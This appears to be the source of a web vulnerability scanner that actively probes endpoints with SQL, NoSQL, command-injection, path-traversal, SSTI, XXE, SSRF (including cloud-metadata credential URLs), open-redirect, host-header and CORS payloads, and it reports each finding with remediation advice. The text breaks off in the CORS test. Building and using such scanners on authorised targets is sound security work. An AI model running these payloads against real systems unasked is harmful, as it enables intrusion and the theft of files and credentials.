/**
 * Active vulnerability testing — comprehensive professional toolkit.
 *
 * Techniques covered:
 *   Error-based SQLi          — database error messages reveal injection point
 *   Boolean/UNION SQLi        — condition-based and data-extraction variants
 *   Time-based blind SQLi     — SLEEP/WAITFOR confirms injection via timing
 *   NoSQL injection           — MongoDB operator injection ($ne, $gt, $regex)
 *   Reflected XSS             — unsanitised input echoed unescaped in response
 *   Path Traversal / LFI      — file path injection reads OS/app files
 *   Command Injection (OS)    — shell metacharacters execute system commands
 *   SSTI                      — template engine evaluates injected expressions
 *   Open Redirect             — redirect parameter abused to external URLs
 *   SSRF                      — server fetches attacker-controlled internal URLs
 *   Host Header Injection     — Host/X-Forwarded-Host used in URL generation
 *   CORS Origin Reflection    — Origin header reflected with credentials
 *   HTTP Verb Tampering       — unexpected methods (DELETE, TRACE) accepted
 *   CRLF Injection            — CR/LF chars injected into HTTP response headers
 *   GraphQL Introspection     — full schema exposed via __schema query
 *   XXE                       — XML external entity parses local files
 *   IDOR Enumeration          — numeric IDs reveal other users' resources
 *   HTTP Parameter Pollution  — duplicate params bypass WAF / logic controls
 *
 * Only use on systems you own or have explicit written permission to test.
 */

// ── SQL Injection payloads ────────────────────────────────────────────────────

const SQLI_PAYLOADS = [
  // Basic syntax-breaking
  "'",
  "''",
  "`",
  '"',
  // Boolean-based
  "1' OR '1'='1",
  "1' OR 1=1--",
  "' OR 'x'='x",
  "1 AND 1=1",
  "1 AND 1=2",
  // UNION-based (column count probing)
  "1 UNION SELECT NULL--",
  "1 UNION SELECT NULL,NULL--",
  "1 UNION SELECT NULL,NULL,NULL--",
  "1 UNION ALL SELECT NULL,NULL--",
  // WAF / filter bypass
  "1'/**/OR/**/'1'='1",
  "1' OR 1=1#",
  "1' OR 1=1/*",
  "1' oR '1'='1",
  "%271%27%20OR%20%271%27%3D%271",
  // Stacked / batch queries
  "1'; SELECT 1--",
  "1; SELECT SLEEP(0)--",
];

const SQLI_TIME_PAYLOADS = [
  { db: 'MySQL',      payload: "1' AND SLEEP(3)--" },
  { db: 'MSSQL',      payload: "1'; WAITFOR DELAY '0:0:3'--" },
  { db: 'PostgreSQL', payload: "1'||pg_sleep(3)--" },
  { db: 'Oracle',     payload: "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS$',3)--" },
];

const SQLI_SIGNATURES = [
  // MySQL / MariaDB
  /you have an error in your sql syntax/i,
  /warning:\s*mysql/i,
  /mysql_fetch_/i,
  /supplied argument is not a valid mysql/i,
  /root@localhost/i,
  /mysql\.connector\.errors/i,
  // PostgreSQL
  /pg_query\(\)/i,
  /warning:\s*pg_/i,
  /valid PostgreSQL result/i,
  /syntax error at or near/i,
  /unterminated string literal/i,
  /org\.postgresql\.util\.PSQLException/i,
  // MSSQL / SQL Server
  /microsoft ole db provider for sql server/i,
  /incorrect syntax near/i,
  /unclosed quotation mark after the character string/i,
  /\.net sqlclient data provider/i,
  /\[Microsoft\]\[ODBC/i,
  /microsoft sql native client/i,
  /sqlserver.*exception/i,
  // Oracle
  /ora-\d{4,5}:/i,
  /oracle.*driver/i,
  /quoted string not properly terminated/i,
  /ORA-01756/i,
  // SQLite
  /sqlite\/jdbcdriver/i,
  /sqlite\.exception/i,
  /system\.data\.sqlite\.sqliteexception/i,
  /near ".*": syntax error/i,
  /unrecognized token:/i,
  // DB2
  /db2 sql error\s*:/i,
  /com\.ibm\.db2/i,
  // PHP PDO / generic
  /PDOException.*SQLSTATE/i,
  /SQLSTATE\[\w+\].*SQL/i,
  /Fatal error.*SQL/i,
  /warning:\s*odbc/i,
  // ORM / framework errors
  /ProgrammingError at\s+\//i,
  /OperationalError at\s+\//i,
  /django\.db\.utils\.(Operational|Programming)Error/i,
  /Illuminate\\Database\\QueryException/i,
  /SQLSTATE\[.*\].*Illuminate/i,
  /ActiveRecord::StatementInvalid/i,
  /PG::SyntaxError:/i,
  /org\.hibernate\.exception/i,
  /could not extract ResultSet/i,
  /org\.springframework\.dao/i,
  /SequelizeDatabaseError/i,
  /SequelizeUniqueConstraintError/i,
  /Doctrine\\DBAL\\Exception/i,
  /Doctrine\\ORM\\ORMException/i,
];

// ── NoSQL (MongoDB) injection ──────────────────────────────────────────────────

const NOSQL_PARAMS = [
  ['[$ne]', '1'],
  ['[$gt]', ''],
  ['[$regex]', '.*'],
  ['[$where]', '1==1'],
];

const NOSQL_SUCCESS_HINTS = [
  /welcome|dashboard|logged.?in|success|authenticated/i,
];

// ── XSS Reflection ────────────────────────────────────────────────────────────

const XSS_MARKER = 'xss7331test';
const XSS_PAYLOADS = [
  `<${XSS_MARKER}>`,
  `"><${XSS_MARKER}>`,
  `'><${XSS_MARKER}>`,
  `javascript:/*--><${XSS_MARKER}>`,
  `${XSS_MARKER}<script>`,
  `\"><svg onload=${XSS_MARKER}>`,
];

// ── Path Traversal / LFI ──────────────────────────────────────────────────────

const PATH_TRAVERSAL_PAYLOADS = [
  '../etc/passwd',
  '../../etc/passwd',
  '../../../etc/passwd',
  '../../../../etc/passwd',
  '../../../../../etc/passwd',
  '..%2Fetc%2Fpasswd',
  '%2e%2e%2fetc%2fpasswd',
  '%2e%2e/%2e%2e/etc/passwd',
  '....//....//etc/passwd',
  '..//..//..//etc/passwd',
  '/etc/passwd',
  '/etc/shadow',
  '/proc/self/environ',
  '..%5c..%5cwindows%5cwin.ini',
  '../WEB-INF/web.xml',
  '%252e%252e%252fetc%252fpasswd',
  '/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
];

const PATH_TRAVERSAL_SIGS = [
  /root:[x*]:0:0:/,
  /daemon:[x*]:/,
  /nobody:[x*]:/,
  /\[boot loader\]/i,
  /\[operating systems\]/i,
  /<web-app/i,
  /\/bin\/(ba)?sh/,
  /proc\/self\/environ/,
];

// ── Command Injection ─────────────────────────────────────────────────────────

const CMD_PAYLOADS = [
  ';id',
  '|id',
  '&&id',
  '||id',
  '`id`',
  '$(id)',
  ';whoami',
  '|whoami',
  '%0aid',
  '%0a/usr/bin/id',
  '\nid\n',
  '& ping -c 1 127.0.0.1 &',
  '&& dir',
  '| dir',
  ';sleep 1',
  '|sleep 1',
  ';ls -la',
  '|ls -la',
  '$(sleep 1)',
  '`sleep 1`',
];

const CMD_SIGS = [
  /uid=\d+\(.+?\)\s+gid=\d+/,
  /www-data|apache2?|nginx|nobody/i,
  /Volume in drive [A-Z]/i,
  /Directory of [A-Z]:\\/i,
  /ping statistics/i,
  /packets transmitted/i,
  /total \d+\s+\d+/,
];

// ── SSTI (Server-Side Template Injection) ─────────────────────────────────────

const SSTI_PAYLOADS = [
  { payload: '{{7*7}}',     expected: /\b49\b/,  engine: 'Jinja2 / Twig' },
  { payload: '${7*7}',      expected: /\b49\b/,  engine: 'Freemarker / Thymeleaf / EL' },
  { payload: '<%= 7*7 %>', expected: /\b49\b/,  engine: 'ERB (Ruby)' },
  { payload: '#{7*7}',      expected: /\b49\b/,  engine: 'Ruby Slim / Haml' },
  { payload: '*{7*7}',      expected: /\b49\b/,  engine: 'Spring SpEL' },
  { payload: "{{7*'7'}}",   expected: /7777777/, engine: 'Twig (PHP)' },
  { payload: '{{config}}',  expected: /SECRET_KEY|SQLALCHEMY|DEBUG|Config/i, engine: 'Flask/Jinja2 (config dump)' },
];

// ── Open Redirect ─────────────────────────────────────────────────────────────

const REDIRECT_PARAMS = [
  'redirect', 'redirect_uri', 'redirect_url', 'url', 'next', 'return',
  'return_url', 'returnUrl', 'goto', 'target', 'destination', 'dest',
  'forward', 'continue', 'callback', 'redir', 'location', 'to', 'out',
  'view', 'logoutRedirectUri', 'successRedirect', 'failureRedirect',
];

const REDIRECT_MARKER = 'evil.example.com';
const OPEN_REDIRECT_PAYLOADS = [
  `https://${REDIRECT_MARKER}`,
  `//${REDIRECT_MARKER}`,
  `/\\${REDIRECT_MARKER}`,
  `https:${REDIRECT_MARKER}`,
  `\\/\\/${REDIRECT_MARKER}`,
  `http://${REDIRECT_MARKER}`,
  `///${REDIRECT_MARKER}`,
];

// ── SSRF ──────────────────────────────────────────────────────────────────────

const SSRF_URL_PARAM_PATTERN = /url|uri|path|src|source|dest|destination|href|link|target|webhook|callback|feed|fetch|load|import|endpoint|proxy|remote|download|file/i;

const SSRF_PAYLOADS = [
  'http://169.254.169.254/latest/meta-data/',
  'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
  'http://metadata.google.internal/computeMetadata/v1/',
  'http://100.100.100.200/latest/meta-data/',
  'http://127.0.0.1/',
  'http://127.0.0.1:8080/',
  'http://127.0.0.1:3000/',
  'http://127.0.0.1:6379/',
  'http://127.0.0.1:27017/',
  'http://0177.0.0.1/',
  'http://2130706433/',
  'http://[::1]/',
  'http://localhost/',
  'http://localhost:8080/',
];

const SSRF_SIGS = [
  /ami-id|instance-id|local-ipv4|public-hostname|security-credentials/i,
  /computeMetadata|project-id|service-account/i,
  /"iamInstanceProfile"|"accessKeyId"/i,
  /root:[x*]:0:0:/,
  /"version"\s*:\s*"\d+\.\d+/,
];

// ── Host Header Injection ─────────────────────────────────────────────────────

const EVIL_HOST = 'evil.example.com';
const HOST_INJECTION_HEADERS = [
  'X-Forwarded-Host',
  'X-Host',
  'X-Forwarded-Server',
  'X-HTTP-Host-Override',
  'Forwarded',
];

// ── GraphQL ───────────────────────────────────────────────────────────────────

const GRAPHQL_PATHS = [
  '/graphql', '/api/graphql', '/v1/graphql', '/v2/graphql',
  '/query', '/gql', '/graphiql', '/playground',
  '/api/query', '/api/v1/graphql', '/api/v2/graphql', '/graph',
];

const INTROSPECTION_QUERY = JSON.stringify({ query: '{ __schema { types { name kind } } }' });
const GRAPHQL_BATCH_QUERY = JSON.stringify([
  { query: '{ __typename }' },
  { query: '{ __typename }' },
]);

// ── XXE ───────────────────────────────────────────────────────────────────────

const XXE_PAYLOADS = [
  {
    name: '/etc/passwd via SYSTEM entity',
    body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    sigs: [/root:[x*]:0:0:/, /nobody:[x*]:/],
  },
  {
    name: 'Parameter entity exfiltration',
    body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><root/>',
    sigs: [/root:[x*]:0:0:/, /daemon:[x*]:/],
  },
];

// ── CRLF Injection ────────────────────────────────────────────────────────────

const CRLF_PAYLOADS = [
  '%0d%0aX-Injected: crlftest',
  '%0aX-Injected: crlftest',
  '%0d%0aSet-Cookie: crlftest=1',
  '%0d%0a%0d%0a<html>CRLFBODY</html>',
  '\r\nX-Injected: crlftest',
];

const TRAVERSAL_PAYLOADS = [
  '../../../../etc/passwd',
  '..\\..\\..\\..\\windows\\win.ini',
  '..%2f..%2f..%2f..%2fetc%2fpasswd',
  '..%5c..%5c..%5c..%5cwindows%5cwin.ini',
];

const TRAVERSAL_SIGNATURES = [
  /root:x:0:0:/i,
  /daemon:x:/i,
  /\[fonts\]/i,
  /\[extensions\]/i,
];

const CMDI_PAYLOADS = [
  ';id',
  '|whoami',
  '&&id',
  ';cat /etc/passwd',
  '|type C:\\Windows\\win.ini',
];

const CMDI_SIGNATURES = [
  /uid=\d+\(.+?\)\s+gid=\d+/i,
  /root:x:0:0:/i,
  /\b(www-data|wwwrun|apache|nginx)\b/i,
  /\[fonts\]/i,
  /\[extensions\]/i,
  /sh:\s*\d+:\s*.*not found/i,
  /cmd\.exe|command not found|is not recognized as an internal or external command/i,
];

// ── Shared helpers ────────────────────────────────────────────────────────────

async function tryFetch(url, timeoutMs, opts = {}) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  try {
    const res = await fetch(url, {
      signal: controller.signal,
      mode: 'cors',
      credentials: 'omit',
      ...opts,
    });
    clearTimeout(timer);
    let body = '';
    try { body = await res.text(); } catch { /* opaque CORS response */ }
    return { ok: true, body, status: res.status, headers: res.headers };
  } catch {
    clearTimeout(timer);
    return { ok: false, body: '', status: null, headers: null };
  }
}

function injectParam(endpoint, fallbackKey, value) {
  const u = new URL(endpoint);
  const params = [...u.searchParams.entries()];
  if (params.length > 0) {
    u.searchParams.set(params[0][0], value);
  } else {
    u.searchParams.set(fallbackKey, value);
  }
  return u.href;
}

// ── Error-Based SQL Injection ─────────────────────────────────────────────────

/**
 * Test endpoints for error-based SQL injection.
 * Sends payloads that break SQL syntax and checks for database error messages.
 */
export async function testSqliEndpoints(endpoints, timeoutMs = 8000) {
  const results = [];
  const done = new Set();

  for (const endpoint of endpoints.slice(0, 10)) {
    let basePath;
    try { basePath = new URL(endpoint).pathname; } catch { continue; }
    if (done.has(basePath)) continue;

    for (const payload of SQLI_PAYLOADS) {
      let testUrl;
      try { testUrl = injectParam(endpoint, 'id', payload); } catch { continue; }

      const { ok, body } = await tryFetch(testUrl, timeoutMs);
      if (!ok) continue;

      for (const sig of SQLI_SIGNATURES) {
        if (sig.test(body)) {
          done.add(basePath);
          results.push({
            id: `sqli-err-${results.length}`,
            name: 'SQL Injection — Error-Based',
            category: 'Injection',
            severity: 'critical',
            technique: 'error-based-sqli',
            targeting: 'GET parameter injection with syntax-breaking payloads (single quotes, UNION SELECT, boolean conditions) — triggers visible database error messages from MySQL, PostgreSQL, MSSQL, Oracle, SQLite, Django, Laravel, Rails, Hibernate, Sequelize',
            description: `Payload "${payload}" caused the server to return a database error message. The backend concatenates user input directly into a SQL query without sanitisation.`,
            guidance: 'Use parameterised queries / prepared statements. Never build SQL by concatenating user input.',
            matches: [testUrl],
            sources: [endpoint],
            type: 'vuln',
          });
          break;
        }
      }
      if (done.has(basePath)) break;
    }
  }
  return results;
}

// ── Time-Based Blind SQL Injection ────────────────────────────────────────────

/**
 * Test endpoints for time-based blind SQL injection.
 * Measures baseline response time, then injects SLEEP/WAITFOR payloads.
 */
export async function testSqliTimeBased(endpoints, timeoutMs = 10000) {
  const results = [];
  const done = new Set();

  for (const endpoint of endpoints.slice(0, 6)) {
    let basePath;
    try { basePath = new URL(endpoint).pathname; } catch { continue; }
    if (done.has(basePath)) continue;

    let baselineMs = 2000;
    try {
      const t0 = Date.now();
      await tryFetch(injectParam(endpoint, 'id', '1'), 3000);
      baselineMs = Date.now() - t0;
    } catch { /* use default */ }

    for (const { db, payload } of SQLI_TIME_PAYLOADS) {
      let testUrl;
      try { testUrl = injectParam(endpoint, 'id', payload); } catch { continue; }

      const t0 = Date.now();
      const { ok } = await tryFetch(testUrl, timeoutMs);
      const elapsed = Date.now() - t0;

      if (ok && elapsed >= baselineMs + 2500) {
        done.add(basePath);
        results.push({
          id: `sqli-time-${results.length}`,
          name: 'SQL Injection — Time-Based Blind',
          category: 'Injection',
          severity: 'critical',
          technique: 'time-based-blind-sqli',
          targeting: `Timing side-channel attack — injected ${db} SLEEP/WAITFOR delay payload and measured response time delta vs baseline (${(baselineMs/1000).toFixed(1)}s baseline)`,
          description: `${db} delay payload "${payload}" caused a ${(elapsed/1000).toFixed(1)}s response (baseline: ${(baselineMs/1000).toFixed(1)}s). The injected SLEEP/WAITFOR executed, confirming blind SQL injection even without visible errors.`,
          guidance: 'Use parameterised queries. Blind SQLi is especially dangerous — harder to detect with WAFs and logging.',
          matches: [testUrl],
          sources: [endpoint],
          type: 'vuln',
        });
        break;
      }
    }
  }
  return results;
}

// ── NoSQL Injection ───────────────────────────────────────────────────────────

/**
 * Test endpoints for MongoDB-style NoSQL injection via URL query parameters.
 */
export async function testNoSqlEndpoints(endpoints, timeoutMs = 8000) {
  const results = [];
  const done = new Set();

  for (const endpoint of endpoints.slice(0, 10)) {
    let basePath, baselineStatus;
    try { basePath = new URL(endpoint).pathname; } catch { continue; }
    if (done.has(basePath)) continue;

    const { status: s0, body: b0 } = await tryFetch(endpoint, timeoutMs);
    baselineStatus = s0;

    for (const [opKey, opVal] of NOSQL_PARAMS) {
      let testUrl;
      try {
        const u = new URL(endpoint);
        const params = [...u.searchParams.entries()];
        if (params.length > 0) {
          u.searchParams.delete(params[0][0]);
          u.searchParams.set(`${params[0][0]}${opKey}`, opVal);
        } else {
          u.searchParams.set(`username${opKey}`, opVal);
        }
        testUrl = u.href;
      } catch { continue; }

      const { ok, body, status } = await tryFetch(testUrl, timeoutMs);
      if (!ok) continue;

      const possibleBypass =
        (baselineStatus === 401 || baselineStatus === 403 || baselineStatus === 404) && status === 200;
      const successKeyword =
        NOSQL_SUCCESS_HINTS.some(re => re.test(body) && !re.test(b0 ?? ''));

      if (possibleBypass || successKeyword) {
        done.add(basePath);
        results.push({
          id: `nosql-${results.length}`,
          name: 'NoSQL Injection (MongoDB Operator)',
          category: 'Injection',
          severity: 'critical',
          technique: 'nosql-operator-injection',
          targeting: 'MongoDB operator injection via URL parameters — tested $ne, $gt, $regex, $where operators to bypass authentication and query logic',
          description: `Operator parameter "${opKey}=${opVal}" changed server response from HTTP ${baselineStatus} to HTTP ${status}${successKeyword ? ' with authentication success keywords' : ''}. Backend passes URL params directly into MongoDB query filters.`,
          guidance: 'Validate and whitelist all input before passing to database queries. Use schema validation (Joi, Zod) and avoid constructing query filters from raw request data.',
          matches: [testUrl],
          sources: [endpoint],
          type: 'vuln',
        });
        break;
      }
    }
  }
  return results;
}

// ── Reflected XSS ─────────────────────────────────────────────────────────────

/**
 * Test endpoints for reflected XSS by injecting a unique marker string.
 */
export async function testXssEndpoints(endpoints, timeoutMs = 8000) {
  const results = [];
  const done = new Set();

  for (const endpoint of endpoints.slice(0, 10)) {
    let basePath;
    try { basePath = new URL(endpoint).pathname; } catch { continue; }
    if (done.has(basePath)) continue;

    for (const payload of XSS_PAYLOADS) {
      let testUrl;
      try {
        const u = new URL(endpoint);
        const params = [...u.searchParams.entries()];
        if (params.length > 0) {
          u.searchParams.set(params[0][0], payload);
        } else {
          u.searchParams.set('q', payload);
        }
        testUrl = u.href;
      } catch { continue; }

      const { ok, body } = await tryFetch(testUrl, timeoutMs);
      if (!ok) continue;

      if (body.includes(XSS_MARKER)) {
        done.add(basePath);
        results.push({
          id: `xss-${results.length}`,
          name: 'Reflected XSS',
          category: 'Client-Side',
          severity: 'high',
          technique: 'reflected-xss',
          targeting: 'Reflected cross-site scripting — injected HTML/script tag payloads into GET parameters (q, search, name, id) and tested if they appear unescaped in the response body',
          description: `Payload "${payload}" was reflected back unescaped in the response. An attacker can craft a malicious URL that executes arbitrary JavaScript in a victim\'s browser.`,
          guidance: 'Escape all user-supplied data before inserting it into HTML. Implement a strict Content-Security-Policy as defence-in-depth.',
          matches: [testUrl],
          sources: [endpoint],
          type: 'vuln',
        });
        break;
      }
    }
  }
  return results;
}

// ── Path Traversal / LFI ──────────────────────────────────────────────────────

/**
 * Test endpoints for path traversal / local file inclusion.
 * Injects ../etc/passwd and related payloads into file-like parameters.
 */
export async function testPathTraversal(endpoints, timeoutMs = 8000) {
  const results = [];
  const done = new Set();

  for (const endpoint of endpoints.slice(0, 10)) {
    let basePath;
    try { basePath = new URL(endpoint).pathname; } catch { continue; }
    if (done.has(basePath)) continue;

    for (const payload of PATH_TRAVERSAL_PAYLOADS) {
      let testUrl;
      try { testUrl = injectParam(endpoint, 'file', payload); } catch { continue; }

      const { ok, body } = await tryFetch(testUrl, timeoutMs);
      if (!ok || !body) continue;

      for (const sig of PATH_TRAVERSAL_SIGS) {
        if (sig.test(body)) {
          done.add(basePath);
          results.push({
            id: `lfi-${results.length}`,
            name: 'Path Traversal / Local File Inclusion',
            category: 'Injection',
            severity: 'critical',
            technique: 'path-traversal',
            targeting: 'Filesystem path injection via user-controlled parameters (file, path, dir, include, page, template, doc) — tested ../ sequences, URL-encoded traversal, null bytes, and absolute paths targeting /etc/passwd, /proc/self/environ, WEB-INF/web.xml',
            description: `Payload "${payload}" returned content matching a system file pattern. The server reads filesystem paths based on user input without containment.`,
            guidance: 'Validate file paths against a strict allowlist. Use realpath() to resolve and assert paths remain within the intended directory. Never expose raw filesystem access to user input.',
            matches: [testUrl],
            sources: [endpoint],
            type: 'vuln',
          });
          break;
        }
      }
      if (done.has(basePath)) break;
    }
  }
  return results;
}

// ── Command Injection ─────────────────────────────────────────────────────────

/**
 * Test endpoints for OS command injection via shell metacharacters.
 */
export async function testCommandInjection(endpoints, timeoutMs = 8000) {
  const results = [];
  const done = new Set();

  for (const endpoint of endpoints.slice(0, 8)) {
    let basePath;
    try { basePath = new URL(endpoint).pathname; } catch { continue; }
    if (done.has(basePath)) continue;

    for (const payload of CMD_PAYLOADS) {
      let testUrl;
      try { testUrl = injectParam(endpoint, 'cmd', payload); } catch { continue; }

      const { ok, body } = await tryFetch(testUrl, timeoutMs);
      if (!ok || !body) continue;

      for (const sig of CMD_SIGS) {
        if (sig.test(body)) {
          done.add(basePath);
          results.push({
            id: `cmdi-${results.length}`,
            name: 'Command Injection (OS)',
            category: 'Injection',
            severity: 'critical',
            technique: 'command-injection',
            targeting: 'OS command injection via shell metacharacters — tested semicolons, pipes, ampersands, backticks, $() subshells, newlines, and URL-encoded equivalents injected into all GET parameters; detecting id/whoami output and directory listings',
            description: `Payload "${payload}" caused the server response to contain OS command output (uid/gid, user name, directory listing). The server passes user-controlled input to a system shell command.`,
            guidance: 'Never pass user input to system shells. Use parameterised subprocess calls with explicit argument arrays. Apply allowlist-only input validation. Disable shell execution in web contexts entirely.',
            matches: [testUrl],
            sources: [endpoint],
            type: 'vuln',
          });
          break;
        }
      }
      if (done.has(basePath)) break;
    }
  }
  return results;
}

// ── Server-Side Template Injection (SSTI) ─────────────────────────────────────

/**
 * Test endpoints for SSTI by injecting arithmetic expressions into parameters.
 * If the server evaluates 7*7 and returns 49, template injection is confirmed.
 */
export async function testSsti(endpoints, timeoutMs = 8000) {
  const results = [];
  const done = new Set();

  for (const endpoint of endpoints.slice(0, 10)) {
    let basePath;
    try { basePath = new URL(endpoint).pathname; } catch { continue; }
    if (done.has(basePath)) continue;

    for (const { payload, expected, engine } of SSTI_PAYLOADS) {
      let testUrl;
      try { testUrl = injectParam(endpoint, 'name', payload); } catch { continue; }

      const { ok, body } = await tryFetch(testUrl, timeoutMs);
      if (!ok || !body) continue;

      if (expected.test(body)) {
        done.add(basePath);
        results.push({
          id: `ssti-${results.length}`,
          name: 'Server-Side Template Injection (SSTI)',
          category: 'Injection',
          severity: 'critical',
          technique: 'ssti',
          targeting: `Template engine code evaluation — injected arithmetic expressions ({{7*7}}, \${7*7}, <%= 7*7 %>) into GET parameters targeting Jinja2, Twig, Freemarker, ERB, SpEL, and Smarty template engines; confirmed by arithmetic result in response`,
          description: `Payload "${payload}" was evaluated server-side; the arithmetic result appeared in the response, confirming template injection. Engine fingerprinted as: ${engine}.`,
          guidance: 'Never render user-controlled input as a template. Pass user data as context variables only — never as template source. Use sandboxed rendering environments.',
          matches: [testUrl],
          sources: [endpoint],
          type: 'vuln',
        });
        break;
      }
    }
  }
  return results;
}

// ── Open Redirect ─────────────────────────────────────────────────────────────

/**
 * Test for open redirect by injecting external URLs into redirect-like parameters.
 */
export async function testOpenRedirect(endpoints, timeoutMs = 8000) {
  const results = [];
  const done = new Set();

  for (const endpoint of endpoints.slice(0, 10)) {
    let basePath;
    try { basePath = new URL(endpoint).pathname; } catch { continue; }
    if (done.has(basePath)) continue;

    const u = new URL(endpoint);
    const params = [...u.searchParams.entries()];
    const redirectParam = params.find(([k]) =>
      REDIRECT_PARAMS.some(n => k.toLowerCase().includes(n))
    );
    const paramName = redirectParam ? redirectParam[0] : REDIRECT_PARAMS[0];

    for (const payload of OPEN_REDIRECT_PAYLOADS) {
      let testUrl;
      try {
        const tu = new URL(endpoint);
        tu.searchParams.set(paramName, payload);
        testUrl = tu.href;
      } catch { continue; }

      const { ok, body, status } = await tryFetch(testUrl, timeoutMs);
      if (!ok) continue;

      const isExternalRedirect =
        (status === 301 || status === 302 || status === 303 || status === 307) &&
        body.includes(REDIRECT_MARKER);
      const isReflected = body.includes(REDIRECT_MARKER);

      if (isExternalRedirect || isReflected) {
        done.add(basePath);
        results.push({
          id: `redirect-${results.length}`,
          name: 'Open Redirect',
          category: 'Client-Side',
          severity: 'high',
          technique: 'open-redirect',
          targeting: `Redirect parameter injection — scanned all parameters for redirect-related names (redirect, url, next, return, goto, target, destination, callback, etc.) and injected external URLs with various encoding bypasses (//evil, /\\evil, https:evil)`,
          description: `Parameter "${paramName}=${payload}" caused the server to redirect or reflect an external domain (HTTP ${status}). Attackers use this to redirect victims to phishing pages while displaying a legitimate domain in the URL.`,
          guidance: 'Validate redirect targets against a strict allowlist of known-good paths. Never redirect to user-supplied absolute URLs. Use relative paths only.',
          matches: [testUrl],
          sources: [endpoint],
          type: 'vuln',
        });
        break;
      }
    }
  }
  return results;
}

// ── SSRF (Server-Side Request Forgery) ────────────────────────────────────────

/**
 * Test for SSRF by injecting cloud metadata and internal service URLs
 * into URL-like parameters and checking if the server fetches them.
 */
export async function testSsrf(endpoints, timeoutMs = 8000) {
  const results = [];
  const done = new Set();

  for (const endpoint of endpoints.slice(0, 8)) {
    let basePath;
    try { basePath = new URL(endpoint).pathname; } catch { continue; }
    if (done.has(basePath)) continue;

    const u = new URL(endpoint);
    const params = [...u.searchParams.entries()];
    const urlParam = params.find(([k]) => SSRF_URL_PARAM_PATTERN.test(k));
    if (!urlParam && params.length === 0) continue;

    const paramName = urlParam ? urlParam[0] : 'url';

    for (const payload of SSRF_PAYLOADS) {
      let testUrl;
      try {
        const tu = new URL(endpoint);
        tu.searchParams.set(paramName, payload);
        testUrl = tu.href;
      } catch { continue; }

      const { ok, body } = await tryFetch(testUrl, timeoutMs);
      if (!ok || !body) continue;

      for (const sig of SSRF_SIGS) {
        if (sig.test(body)) {
          done.add(basePath);
          results.push({
            id: `ssrf-${results.length}`,
            name: 'Server-Side Request Forgery (SSRF)',
            category: 'Infrastructure',
            severity: 'critical',
            technique: 'ssrf',
            targeting: `Internal network probing via URL-controlled parameters (url, uri, src, href, webhook, callback, fetch, proxy, remote) — tested AWS IMDS (169.254.169.254), GCP metadata, Alibaba Cloud metadata, localhost on common internal ports (80, 8080, 3000, 6379/Redis, 27017/MongoDB)`,
            description: `SSRF payload "${payload}" via parameter "${paramName}" triggered a response matching cloud metadata or internal service signatures. The server fetches URLs supplied by the user without SSRF protection.`,
            guidance: 'Validate and allowlist all outbound request destinations. Block RFC 1918 / link-local IP ranges at network layer. Disable cloud metadata service access from application servers (IMDSv2 for AWS).',
            matches: [testUrl],
            sources: [endpoint],
            type: 'vuln',
          });
          break;
        }
      }
      if (done.has(basePath)) break;
    }
  }
  return results;
}

// ── Host Header Injection ─────────────────────────────────────────────────────

/**
 * Test for Host header injection by sending forged Host/X-Forwarded-Host headers.
 * If the injected value appears in the response, the app uses the header for URL generation.
 */
export async function testHostHeaderInjection(baseUrl, timeoutMs = 8000) {
  const results = [];

  for (const headerName of HOST_INJECTION_HEADERS) {
    try {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), timeoutMs);
      const res = await fetch(baseUrl, {
        signal: controller.signal,
        mode: 'cors',
        credentials: 'omit',
        headers: { [headerName]: EVIL_HOST },
      });
      clearTimeout(timer);
      let body = '';
      try { body = await res.text(); } catch {}

      if (body.includes(EVIL_HOST) || body.includes('evil.example')) {
        results.push({
          id: `hosthdr-${results.length}`,
          name: 'Host Header Injection',
          category: 'Infrastructure',
          severity: 'high',
          technique: 'host-header-injection',
          targeting: `HTTP host header manipulation — sent forged "${headerName}: ${EVIL_HOST}" and related headers (X-Forwarded-Host, X-Host, X-Forwarded-Server) to test if the application uses the header value to generate URLs (password reset links, email confirmations, API base URLs)`,
          description: `The injected "${headerName}: ${EVIL_HOST}" value appeared in the response body, confirming the application trusts the Host header for URL generation. This enables password reset link poisoning (victim clicks a link to attacker-controlled domain) and web cache poisoning.`,
          guidance: 'Whitelist allowed hostnames. Never use the Host header to construct absolute URLs — use a configured base URL from environment variables instead. Validate Host headers at the reverse proxy layer.',
          matches: [`${headerName}: ${EVIL_HOST} → reflected in response`],
          sources: [baseUrl],
          type: 'vuln',
        });
        break;
      }
    } catch { /* ignore */ }
  }
  return results;
}

// ── CORS Misconfiguration ─────────────────────────────────────────────────────

/**
 * Test for CORS misconfiguration by sending forged Origin headers
 * and checking if the server reflects them in ACAO header.
 */
export async function testCorsMisconfiguration(endpoints, timeoutMs = 8000) {
  const results = [];
  const done = new Set();
  const evilOrigins = ['https://evil.example.com', 'null'];

  for (const endpoint of endpoints.slice(0, 8)) {
    let basePath;
    try { basePath = new URL(endpoint).pathname; } catch { continue; }
    if (done.has(basePath)) continue;

    for (const origin of evilOrigins) {
      try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), timeoutMs);
        const res = await fetch(endpoint, {
          signal: controller.signal,
          mode: 'cors',
          credentials: 'include',
          headers: { Origin: origin },
        });
        clearTimeout(timer);

        const acao = res.headers.get('access-control-allow-origin');
        const acac = res.headers.get('access-control-allow-credentials');

        if (acao && (acao === origin || acao === '*')) {
          const credentialsAllowed = acac === 'true';
          done.add(basePath);
          results.push({
            id: `cors-abuse-${results.length}`,
            name: 'CORS Origin Reflection / Misconfiguration',
            category: 'Infrastructure',
            severity: credentialsAllowed ? 'critical' : 'high',
            technique: 'cors-reflection',
            targeting: 'Cross-origin policy abuse — sent forged Origin headers (evil.example.com, null) to test ACAO header reflection and whether Access-Control-Allow-Credentials: true is combined with origin reflection',
            description: `Server responded with "Access-Control-Allow-Origin: ${acao}"${credentialsAllowed ? ' and "Access-Control-Allow-Credentials: true"' : ''}. ${credentialsAllowed ? 'With credentials enabled, any website can make authenticated cross-origin requests on behalf of logged-in users and read responses.' : 'An attacker-controlled site can read this endpoint\'s responses.'}`,
